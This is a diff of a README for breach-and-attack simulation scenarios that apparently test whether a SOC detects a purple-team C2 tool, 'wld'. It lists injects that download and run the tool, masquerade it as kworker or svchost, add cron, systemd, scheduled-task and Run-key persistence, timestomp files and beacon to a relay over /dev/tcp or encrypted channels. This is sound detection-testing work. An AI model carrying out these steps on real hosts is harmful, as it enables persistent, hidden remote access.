@@ -1,109 +1,90 @@
-# wetland — OpenAEV / OpenBAS simulation
+# wetland — SOC detection scenarios (OpenAEV / OpenBAS)
 
-`wetland-purple-c2.openaev.zip` (Linux) and `wetland-purple-c2-windows.openaev.zip`
-(Windows) are **breach-and-attack-simulation scenarios** you import into
-[OpenAEV](https://docs.openaev.io/) (formerly OpenBAS). They reproduce the
-`wld lab` purple-team techniques as self-cleaning command payloads so a blue team
-can exercise detections. The **first inject pulls the real `wld` tool onto the
-host** (T1105), the rest exercise evasion → persistence → C2.
+Two **breach-and-attack-simulation scenarios** that exercise the **real wetland
+tool** so a SOC can validate it detects the tool's activity. Every inject
+downloads `wld` from the **v0.1.0 GitHub Release** and runs it a different way —
+this is a detection test of the tool itself, not a stand-in.
 
-> **Import the `.zip`, not the `.json`.** OpenAEV's importer reads a ZIP whose
-> single entry is tagged with the zip **entry comment `Scenario`** — a bare
-> `.json` can be rejected. The `.zip` is built that way; the `.json` is included
-> only for review/diffing. The envelope and injector-contract scaffolding were
-> templated from a real export of a ThreatOps/OpenAEV instance, so the field set,
-> domain id and implant-injector ids match what the platform expects.
+- `wetland-soc-detection-linux.openaev.zip` — Linux assets (`bash`/`sh`)
+- `wetland-soc-detection-windows.openaev.zip` — Windows assets (`psh`)
 
-> ⚠️ **Authorized lab use only.** Every inject is intentionally loud, tags its
-> artifacts with `WETLAND-LAB`, prints an ATT&CK-mapped detection hint, and ships
-> a **cleanup command** that OpenAEV runs to undo it. The goal is detectable
-> telemetry, not stealth.
+> **Import the `.zip`, not the `.json`.** OpenAEV reads a ZIP whose single entry
+> carries the zip **entry comment `Scenario`** — a bare `.json` can be rejected.
+> The `.json` is included only for review. The envelope + injector-contract
+> scaffolding were templated from a real export of a ThreatOps/OpenAEV instance,
+> so the field set, domain id and implant-injector ids match the platform.
 
-## Injects
+> ⚠️ **Authorized lab use only.** Every inject is loud, tags its artifacts with
+> `WETLAND-LAB`, prints an ATT&CK-mapped detection hint, and ships a **cleanup
+> command** OpenAEV runs afterwards. The goal is detectable telemetry.
 
-**Linux** (`wetland-purple-c2.openaev.json`, `bash`/`sh`):
+Pulled from:
+`https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wld-linux-x86_64`
+and `…/wld-windows-x86_64.exe` (saved as `wld.exe`).
 
-| # | delay | Inject | ATT&CK | mirrors |
-|---|-------|--------|--------|---------|
-| 1 | 0s   | **Ingress tool transfer** — `curl` pulls `wld` + runs `wld -h` | T1105 | — |
-| 2 | 60s  | Masquerade — process named as a kernel thread | T1036.004/.005 | `wld -M` / `wld lab masquerade` |
-| 3 | 120s | Persistence — `@reboot` cron entry | T1053.003 | `wld lab persist --method cron` |
-| 4 | 180s | Persistence — systemd `--user` service | T1543.002 | `wld lab persist --method systemd` |
-| 5 | 240s | Hidden file + timestomp | T1564.001/T1070.006 | `wld lab hide` |
-| 6 | 300s | HTTP-shaped C2 beacon | T1071.001/T1571 | `wld lab beacon --as http` |
+## Linux injects — the `wld lab` techniques + the C2 channel
 
-**Windows** (`wetland-purple-c2-windows.openaev.json`, `psh`):
+| # | delay | Inject | wld invocation | ATT&CK |
+|---|-------|--------|----------------|--------|
+| 1 | 0s   | Ingress + exec | download + `wld -h` (SHA256) | T1105 / T1059.004 |
+| 2 | 60s  | Masquerade | `wld lab masquerade --name '[kworker/0:0]'` | T1036.004/.005 |
+| 3 | 120s | Persistence | `wld lab persist --method both` | T1053.003 / T1543.002 |
+| 4 | 180s | Hidden + timestomp | `wld lab hide` | T1564.001 / T1070.006 |
+| 5 | 240s | C2 beacon | `wld lab beacon --to RELAY --as http` | T1071.001 / T1571 / T1008 |
+| 6 | 300s | Encrypted C2 channel | `wld -s … -H RELAY -p PORT` (≤20s) | T1572 / T1573 / T1071.001 |
 
-| # | delay | Inject | ATT&CK |
-|---|-------|--------|--------|
-| 1 | 0s   | **Ingress tool transfer** — `curl.exe` pulls `wld.exe` + runs `wld -h` | T1105 |
-| 2 | 60s  | Masquerade — fake `svchost.exe` from a user path | T1036.004/.005 |
-| 3 | 120s | Persistence — scheduled task (`schtasks`) | T1053.005 |
-| 4 | 180s | Persistence — HKCU `Run` key | T1547.001 |
-| 5 | 240s | Hidden file + timestomp | T1564.001/T1070.006 |
-| 6 | 300s | HTTP-shaped C2 beacon | T1071.001/T1571 |
+Cleanup uses `wld lab uninstall` (injects 3–4) and removes the binary.
 
-Each payload is a **Command** payload on the built-in **OpenAEV Implant**
-(`openaev_implant`) injector, with DETECTION expectations.
+## Windows injects — wld.exe as the core client
 
-## The download (inject #1, T1105)
+`wld`'s `lab` sub-techniques are **POSIX-only**, so on Windows the tool is
+exercised as the core client (download/exec, masquerade-by-rename, persistence
+*of* `wld.exe`, and the encrypted channel):
 
-Inject #1 fetches the **real `wld` tool-under-test** from this repo and runs
-`wld -h` (benign — just prints usage) to produce the download+execute signal:
-curl writing an executable to disk and a new process spawning from it
-(proxy/NDR tool-transfer, EDR exec-after-download). It does **not** start a live
-C2 connection — that stays in the beacon inject's editable `C2=` line, so the
-scenario is a detection test, not a canned implant deployment. Cleanup removes
-the downloaded file.
+| # | delay | Inject | wld invocation | ATT&CK |
+|---|-------|--------|----------------|--------|
+| 1 | 0s   | Ingress + exec | download `wld.exe` + `wld -h` (SHA256) | T1105 / T1059.001 |
+| 2 | 60s  | Masquerade | copy `wld.exe`→`svchost.exe`, run it | T1036.004/.005 |
+| 3 | 120s | Persistence (task) | scheduled task runs `wld.exe` | T1053.005 |
+| 4 | 180s | Persistence (Run key) | HKCU `Run` → `wld.exe` | T1547.001 |
+| 5 | 240s | Encrypted C2 channel | `wld.exe -s … -H RELAY -p PORT` (≤20s) | T1572 / T1573 / T1071.001 |
+| 6 | 300s | Masqueraded C2 | fake `svchost.exe` (wld) → relay (≤20s) | T1036.005 / T1572 / T1573 |
 
-Download source:
-- **Windows** pulls from the published **v0.1.0 Release**, saves it as `wld.exe`,
-  verifies SHA256 + size, then runs `wld -h`:
-  `https://github.com/s4nntysec/wetland/releases/download/v0.1.0/wld-windows-x86_64.exe`
-- **Linux** pulls the committed binary over raw (no release asset assumed):
-  `https://raw.githubusercontent.com/s4nntysec/wetland/main/dist/release/wld-linux-x86_64`
-  (swap to `releases/download/v0.1.0/wld-linux-x86_64` if you add it to the Release).
-
-### Prefer a GitHub Release (recommended)
-
-A Release keeps binaries out of git history and gives a stable
-`releases/latest/download/…` URL. **This environment can't create Releases**
-(no `gh`/API/release tooling here — only `git push`), so publish it yourself:
-
-1. `dist/release/` already holds the built assets (`wld-*`, `wetland-relay-*`,
-   `SHA256SUMS.txt`). A `v0.1.0` tag is pushed.
-2. GitHub → **Releases → Draft a new release** → choose tag `v0.1.0` → attach the
-   four binaries + `SHA256SUMS.txt` → **Publish**.
-3. In both inject #1 payloads, swap the `url` to
-   `https://github.com/s4nntysec/wetland/releases/latest/download/wld-<os>-x86_64[.exe]`
-   (the commented alternative is already in the payload).
-
-macOS: not cross-buildable in this environment — run `make` on a Mac to produce
-`bin/wld` and add it to the Release as `wld-macos-<arch>`.
+Each inject downloads `wld.exe` if missing and cleans it up (kills processes,
+deletes the task / Run value / dropped files).
 
 ## Import & run
 
 1. OpenAEV: **Scenarios → Import** → upload the `.zip`.
 2. Set **targets** — your Linux/Windows **assets** or an **asset group** with an
    OpenAEV agent. Without a target the injects show *Missing Content*.
-3. **Edit the beacon's `C2=` / `$C2` line** (last inject) to your wetland
-   relay/tunnel `host:port` — e.g. the public address `wld -l` prints.
+3. **Edit the relay lines** (beacon + C2 injects): `RELAY` / `RELAY_HOST` /
+   `RELAY_PORT` / `SECRET` (Linux) and `$RelayHost` / `$RelayPort` / `$Secret`
+   (Windows) → your wetland relay/tunnel and the matching shared secret. Stand a
+   listener up with `wld -l` (or `wetland-relay`) so the channel has a peer.
 4. Launch. Review prevention/detection per inject; OpenAEV runs each cleanup.
+
+## What the SOC should catch
+
+- **The tool on disk / executing:** `wld`/`wld.exe` written by curl then run;
+  on Windows the SHA256 matches the known Release asset.
+- **Masquerade:** a process named `[kworker/…]` (Linux) or `svchost.exe` outside
+  System32 (Windows) whose real image is `wld`.
+- **Persistence referencing the tool:** cron/systemd (Linux) or scheduled task /
+  Run key (Windows) whose action is `wld`.
+- **The encrypted channel:** the `wld` process making outbound connections to the
+  relay (custom XChaCha20 E2E handshake; rare-destination, beaconing cadence).
 
 ## Notes
 
-- A recent OpenAEV/OpenBAS with the **OpenAEV Implant** injector and an agent on
-  the targets. Linux injects need **bash** (beacon uses `/dev/tcp`); cron/systemd
-  injects are best-effort and say so if there is no cron spool / user-systemd.
-- The native export format is **version-sensitive**; these were templated
-  field-for-field from a real export of your instance. If an upgrade changes the
-  format, regenerate from a fresh export (below).
-- Manual cleanup if ever needed: `rm ~/.wetland-lab ~/.wetland-lab-wld
-  /tmp/.wetland-lab-kworker ~/.wetland-lab.log`; `crontab -l | grep -v
-  WETLAND-LAB | crontab -`; remove `~/.config/systemd/user/wetland-lab.service`;
-  Windows: `schtasks /Delete /TN WETLAND-LAB /F`, delete the HKCU `Run\WETLAND-LAB`
-  value, `rm $env:TEMP\wetland-lab-*`, `rm $env:APPDATA\.wetland-lab.bin`.
-
-Regenerate: `python3 sim/gen_scn.py <export.json>` (Linux) /
-`python3 sim/gen_scn_win.py <export.json>` (Windows) — the export is used only as
-a structural template; none of its content is copied.
+- Needs a recent OpenAEV/OpenBAS with the **OpenAEV Implant** injector and an
+  agent on the targets. Linux injects need `bash`/`curl`; Windows needs
+  `curl.exe` + PowerShell (both present on current Windows).
+- The native export format is version-sensitive; these were templated
+  field-for-field from a real export of your instance, so they import where it
+  does.
+- Manual cleanup if ever needed — Linux: `~/.wetland-lab-wld lab uninstall`;
+  `rm ~/.wetland-lab-wld ~/.wetland-lab`; `crontab -l | grep -v WETLAND-LAB |
+  crontab -`; remove `~/.config/systemd/user/wetland-lab.service`. Windows:
+  `schtasks /Delete /TN WETLAND-LAB /F`; delete HKCU `Run\WETLAND-LAB`;
+  `rm $env:TEMP\wld.exe $env:TEMP\svchost.exe $env:LOCALAPPDATA\wld.exe`.
